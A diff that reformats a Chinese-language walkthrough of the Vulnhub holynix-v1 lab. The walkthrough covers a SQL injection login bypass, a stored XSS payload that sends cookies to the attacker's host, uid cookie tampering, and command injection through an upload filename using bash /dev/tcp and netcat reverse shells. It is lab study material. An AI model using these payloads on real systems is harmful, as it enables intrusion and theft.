@@ -37,12 +37,12 @@ _这是一台标志低难度的靶机。整个挑战的目标是为了获得 roo
 
 	至此，成功给靶机分配 ip。
 
-## 信息收集
+# 信息收集
 
-### nmap 信息收集
+## nmap 信息收集
 靶机运行ip是 192.168.2.41。
 
-#### 端口扫描&& 详细扫描 && 漏洞脚本扫描
+## 端口扫描&& 详细扫描 && 漏洞脚本扫描
 ```text
 # Nmap 7.98 scan initiated Mon Jul 20 04:37:39 2026 as: /usr/lib/nmap/nmap -sT --min-rate=10000 -p- -oA TCPS 192.168.2.41
 Nmap scan report for 192.168.2.41
@@ -135,151 +135,155 @@ MAC Address: 00:0C:29:75:B1:DE (VMware)
 
 目标开放了 80 端口。进行 web 的信息收集。
 
-## WEB 渗透
+# WEB 渗透
 
-### 登录页面 SQL 注入漏洞
+## 登录页面 SQL 注入漏洞
 
-笔者一开始测试时，觉得用户名处是注入点的概率非常大。_(一般密码都是要进行密文存储的。)_ 
-结果试了半天注入用户名。急得我掏出 sqlmap 进行测试。结果显示密码有注入......
+-  笔者一开始测试时，觉得用户名处是注入点的概率非常大。_(一般密码都是要进行密文存储的。)_ 
+	结果试了半天注入用户名。急得我掏出 sqlmap 进行测试。结果显示密码有注入......
 
-![sql](vulnhubScreenShot/holynix-v1/2026-07-20-062026_2560x1600_scrot.png)
+	![sql](vulnhubScreenShot/holynix-v1/2026-07-20-062026_2560x1600_scrot.png)
 
-开始手工测试。发现是个报错注入。
+	开始手工测试。发现是个报错注入。
 
-![sql1](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_06_20_07.png)
+	![sql1](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_06_20_07.png)
 
-```sql
-password: 000' or 1=1 #
-```
-
-成功绕过登录看到用户界面。
-
-![sql2](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_06_22_05.png)
+	```sql
+     password: 000' or 1=1 #
+	```
 
 
+	成功绕过登录看到用户界面。
+
+	![sql2](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_06_22_05.png)
 
 
-### 存储型 XSS 钓鱼
-
-在测试网站文件上传功能的时候，发现当前用户 alamo 没法上传文件，于是想找个其他用户来测试文件上传功能。
-
-![XSS](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_08_56_45.png)
-
-构造 payload
-
-```javascript
-<script>document.location='http://192.168.2.24/1.php?c='+document.cookie</script>
-```
-
-本地搭建一个简易 WEB 服务器
-
-![payload](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_09_27_10.png)
-![server](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_09_31_53.png)
-
-等了很长时间，没有任何人上勾 _(图中显示的是我测试时候不小心误触的部分)_
 
 
-### WEB 页面员工信息收集
+## 存储型 XSS 钓鱼
 
-在等待 xss 的过程中，开始翻看邮箱，论坛和公告。
+- 在测试网站文件上传功能的时候，发现当前用户 alamo 没法上传文件，于是想找个其他用户来测试文件上传功能。
 
-![employee](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_06_27_10.png)
+	![XSS](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_08_56_45.png)
 
-根据论坛的聊天内容来看，服务器有个 22 端口。用端口敲门技术隐藏了。
+	构造 payload
 
-![ssh](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_21_39_44.png)
+	```javascript
+  	<script>document.location='http://192.168.2.24/1.php?c='+document.cookie</script>
+	```
 
-查找时，发现一个信息，这个叫 etenenbaum 的用户在外出差，jjames 说他是不是在湖边。这是个隐藏彩蛋。
+	本地搭建一个简易 WEB 服务器
 
-![lake](vulnhubScreenShot/holynix-v1/kali-linux-2026.1-vmware-amd64-2026-07-22-09-23-49.png)
+	![payload](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_09_27_10.png)
+	![server](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_09_31_53.png)
 
-### 水平越权突破上传限制
+	等了很长时间，没有任何人上勾 _(图中显示的是我测试时候不小心误触的部分)_
 
-抓包发现 Cookie 处使用 uid=1 来鉴别用户。uid=0 表示未登录状态。如果 uid=2 或 3 会不会进入管理员账户？
 
-![limit](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_06_22_31.png)
+## WEB 页面员工信息收集
 
-经过尝试后发现以下用户信息
+- 在等待 xss 的过程中，开始翻看邮箱，论坛和公告。
 
-```text
- alamo     1 Software Development
- etenenbaum 2 Security
- gmckinnon 3 Systems
- hreiser   4 Systems
- jdraper   5 Research
- jjames    6 Research
- jljohansen 7 Software Development
- kpoulsen  8 Systems
-  ltorvalds 9 Administration
-  mrbutler 10 Advertising
-  rtmorris 11 Research
+	![employee](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_06_27_10.png)
 
-```
+	根据论坛的聊天内容来看，服务器有个 22 端口。用端口敲门技术隐藏了。
 
-这里选用 etenenbaum 或者 hreiser 都行，他们都可以上传文件。这里为什么这么执着上次文件呢？因为服务器如果存在上传文件漏洞的话，那么我们可以上传一个 WEBshell，可以很快获得立足点。
+	![ssh](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_21_39_44.png)
 
-### 上传功能处卡顿
+	查找时，发现一个信息，这个叫 etenenbaum 的用户在外出差，jjames 说他是不是在湖边。这是个隐藏彩蛋。
 
-虽然能够正常的上传文件了，但是不知道上传到哪个文件夹。
+	![lake](vulnhubScreenShot/holynix-v1/kali-linux-2026.1-vmware-amd64-2026-07-22-09-23-49.png)
 
-![failed](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_09_35_18.png)
+## 水平越权突破上传限制
 
-它给我返回上传的文件的所有人已经变更。我不明白这是啥意思。_(后面会讲解，暂时不剧透)_
-不断翻看目标爆破的结果，已经没有找到我的WEBshell木马文件。/img/ 目录下只有其他人的照片没有我的木马文件。而 /home.php 返回没有登录
+- 抓包发现 Cookie 处使用 uid=1 来鉴别用户。uid=0 表示未登录状态。如果 uid=2 或 3 会不会进入管理员账户？
 
-![access](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_22_04_10.png)
+	![limit](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_06_22_31.png)
 
-我实现以为木马文件是上传到了 home 文件夹下面。只有找到一个授权的用户到 home 文件触发木马就可以回连。但是我错了，接连试着上方 10 几个用户都没有进入页面。笔者这边开始有点想放弃了......
+	经过尝试后发现以下用户信息
 
-### 任意文件读取漏洞 && 代码审计
+	```text
+   alamo     1 Software Development
+   etenenbaum 2 Security
+   gmckinnon 3 Systems
+   hreiser   4 Systems
+   jdraper   5 Research
+   jjames    6 Research
+   jljohansen 7 Software Development
+   kpoulsen  8 Systems
+   ltorvalds 9 Administration
+   mrbutler 10 Advertising
+   rtmorris 11 Research
+	```
 
-调整了一下状态。在翻看 WEB 页面的过程注意到这里有一个 page 参数，参数里面填写的是页面php 文件。我想会不会后端对这个参数没有校验，导致可以包含任意文件？简单尝试了一下。这个是文件包含的功能，但是有些莫名其妙的报错，利用不通。
+	这里选用 etenenbaum 或者 hreiser 都行，他们都可以上传文件。这里为什么这么执着上次文件呢？因为服务器如果存在上传文件漏洞的话，那么我们可以上传一个 WEBshell，可以很快获得立足点。
 
-![test](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_09_39_51.png)
+## 上传功能处卡顿
 
-正当我一筹莫展时，我突然想到 Security 模块能够将文件展示到前端。这边是不是会有文件读取漏洞呢？结果显而易见，是的。
+- 虽然能够正常的上传文件了，但是不知道上传到哪个文件夹。
 
-![burp](vulnhubScreenShot/holynix-v1/kali-linux-2026.1-vmware-amd64-2026-07-22-10-10-24.png)
+	![failed](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_09_35_18.png)
 
-![code](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_22_45_27.png)
+	它给我返回上传的文件的所有人已经变更。我不明白这是啥意思。_(后面会讲解，暂时不剧透)_
+	不断翻看目标爆破的结果，已经没有找到我的WEBshell木马文件。/img/ 目录下只有其他人的照片没有我的木马文件。而 /home.php 返回没有登录
 
-可以看到文件上传有个 transfer.php 页面。他会将我们上传的文件名拼接在命令中，使用 php 函数exec执行命令。如果我们能突破限制，就能执行我们自己的命令。我思路是选择这个 $\_FILES\['upload'\]\['name'\]    变量进行我的 payload 注入。就是在
+	![access](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_22_04_10.png)
 
-```php
-exec("sudo mv " .$target. " " .$homedir . $_FILES['uploaded']['name']);
-```
+	我实现以为木马文件是上传到了 home 文件夹下面。只有找到一个授权的用户到 home 文件触发木马就可以回连。但是我错了，接连试着上方 10 几个用户都没有进入页面。笔者这边开始有点想放弃了......
 
-注入 payload ，就是选择不自动解压 gzip 功能的那个分支。应为如果走解压分支。就会得到basename 函数名的处理。basename 虽然不是过滤功能的，但是会吃掉“/”这个路径符号前面的内容。导致我的 payload 失效。
+## 任意文件读取漏洞 && 代码审计
 
-![p1](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-21_03_05_00.png)
-![p2](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-21_03_10_09.png)
-![p3](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-21_04_23_51.png)
+- 调整了一下状态。在翻看 WEB 页面的过程注意到这里有一个 page 参数，参数里面填写的是页面php 文件。我想会不会后端对这个参数没有校验，导致可以包含任意文件？简单尝试了一下。这个是文件包含的功能，但是有些莫名其妙的报错，利用不通。
 
-我草拟了一个 payload 的
+	![test](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_09_39_51.png)
 
-```
-2.jpg;/bin/bash -i >& /dev/tcp/192.168.2.24/5566 0>&1;
-```
+	正当我一筹莫展时，我突然想到 Security 模块能够将文件展示到前端。这边是不是会有文件读取漏洞呢？结果显而易见，是的。
 
-但是执行的结果是 '5566 0>&1;' 。很明显的我的“/”前面的内容被裁剪掉了。
-我查了一下官方文档，
+	![burp](vulnhubScreenShot/holynix-v1/kali-linux-2026.1-vmware-amd64-2026-07-22-10-10-24.png)
 
-![[kali-linux-2026.1-vmware-amd64-2026-07-22-16-30-06.png]]
-我选择的注入点 $_FILES\['uploaded'\]\['name'\] 
-返回的是客户端上传的文件名。像上传" /home/1.jpg"这样的文件。最终文件名会保存为 1.jpg，就是“/”前面的信息路径全部舍弃。我测试过程中，" /1.jpg/ "，它直接搞成“”。
-无奈之下，我改变 payload 。如下
+	![code](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_22_45_27.png)
 
-```shell
-2.tar.gz;nc 192.168.2.24 5566 -c bash
-```
+	可以看到文件上传有个 transfer.php 页面。他会将我们上传的文件名拼接在命令中，使用 php 函数exec执行命令。如果我们能突破限制，就能执行我们自己的命令。我思路是选择这个 $\_FILES\['upload'\]\['name'\]    变量进行我的 payload 注入。就是在
 
-![p4](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-21_04_57_36.png)
-![p5](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-21_04_58_23.png)
+	```php
+  	exec("sudo mv " .$target. " " .$homedir . $_FILES['uploaded']['name']);
+    ```
 
-居然回显了。为啥一开始没想到，因为我以为不一定每台 Linux 主机都有 netcat 这样的软件。
-本地回连过来。
 
-## 权限提升
+	注入 payload ，就是选择不自动解压 gzip 功能的那个分支。应为如果走解压分支。就会得到basename 函数名的处理。basename 虽然不是过滤功能的，但是会吃掉“/”这个路径符号前面的内容。导致我的 payload 失效。
+
+	![p1](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-21_03_05_00.png)
+	![p2](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-21_03_10_09.png)
+	![p3](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-21_04_23_51.png)
+
+	我草拟了一个 payload 的
+
+	```
+  	2.jpg;/bin/bash -i >& /dev/tcp/192.168.2.24/5566 0>&1;
+	```
+
+	但是执行的结果是 '5566 0>&1;' 。很明显的我的“/”前面的内容被裁剪掉了。
+	我查了一下官方文档，
+
+	![[kali-linux-2026.1-vmware-amd64-2026-07-22-16-30-06.png]]
+	我选择的注入点 $_FILES\['uploaded'\]\['name'\] 
+	 
+	返回的是客户端上传的文件名。像上传" /home/1.jpg"这样的文件。最终文件名会保存为1.jpg，就是“/”前面的信息路径全部舍弃。我测试过程中，" /1.jpg/ "，它直接搞成“”。
+	无奈之下，我改变 payload 。如下
+
+	```shell
+  	 2.tar.gz;nc 192.168.2.24 5566 -c bash
+    ```
+
+
+
+	![p4](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-21_04_57_36.png)
+	![p5](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-21_04_58_23.png)
+
+	居然回显了。为啥一开始没想到，因为我以为不一定每台 Linux 主机都有 netcat 这样的软件。
+	本地回连过来。
+
+# 权限提升
 
 ![stepstone](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-21_04_59_55.png)
 
@@ -297,7 +301,7 @@ exec("sudo mv " .$target. " " .$homedir . $_FILES['uploaded']['name']);
 ![root](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-21_07_53_04.png)
 
 运行成功提权。这里的 firefart 用户就是 root 级别的用户。
-### 战利品
+## 战利品
 ![loot](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-21_07_55_13.png)
 
 成功拿下 root 目录下，成员信息的 sql 文件
